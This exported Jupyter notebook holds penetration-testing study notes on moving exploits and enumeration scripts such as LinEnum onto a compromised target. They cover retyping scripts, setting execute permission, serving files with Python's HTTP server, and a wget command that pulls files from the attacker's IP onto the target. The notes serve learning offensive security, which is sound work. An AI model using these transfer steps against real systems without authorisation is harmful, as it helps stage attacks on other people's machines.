#!/usr/bin/env python
# coding: utf-8

# # File Transfer to Machines
# 
# Ok, so you have this great exploit that you can push to a target machine. You even have a low privelige users who can put the file for you. Now the question becomes; "how do I get my file to the remote machine"? As is rather standard with this sort of stuff, the answer is "Many ways".
# 
# ### Just re-make the file
# So this one is often overlooked, but with script files it's probably the easiest method. Simply create a blank file on the target machine and write your script to the file (naturally this only works for scripts). An example of this would be transfering LinEnum to a machine by writing the file with nano or vi. <br>
# Remember to change the script to have execute permissions when you're done.
# > chmod +x [file]
# 
# <hr>
# 
# ### Python's SimpleHTTPServer
# 
# Like it says on the box, a simple http server you can host locally for a remote machine to connect to. On your local machine, create a folder that you want to host files from. In that folder, run the below command.
# 
# ![JrPen-FileInclusion_PythonServer.png](../images/JrPen-FileInclusion_PythonServer.png)
# 
# You can the pull files using wget (as long as the target is routable to you).
# 
# > wget 'http://[yourIP]:[port]/[file.ext]'
# 
# <hr>
# 
# ### Python's HTTP.Server
# Basically the same as above, but for python3. The below hosts on port 8888
# 
# > python3 -m http.server 8888

# In[ ]:





# In[ ]:




